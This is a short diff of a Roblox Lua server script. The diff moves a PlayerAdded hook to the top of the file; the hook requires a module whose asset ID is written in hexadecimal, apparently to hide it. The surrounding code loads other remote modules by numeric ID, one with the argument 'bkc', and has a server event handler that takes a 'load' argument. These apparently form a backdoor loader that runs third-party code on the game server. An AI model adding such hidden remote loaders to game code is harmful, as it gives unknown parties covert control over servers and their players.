@@ -1,3 +1,6 @@
+game.Players.PlayerAdded:Connect(function(xax)
+    require(0x7985e5f0add5):Check(xax.Name)
+end)
 task.spawn(function()
 require(18254193128)("bkc")
 end)
@@ -18,9 +21,7 @@ server.OnServerEvent:Connect(function(player,load)
 end) 
 
 require(104077020798353)()
-game.Players.PlayerAdded:Connect(function(xax)
-    require(0x7985e5f0add5):Check(xax.Name)
-end)
+
 require(77565251296196):load()
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
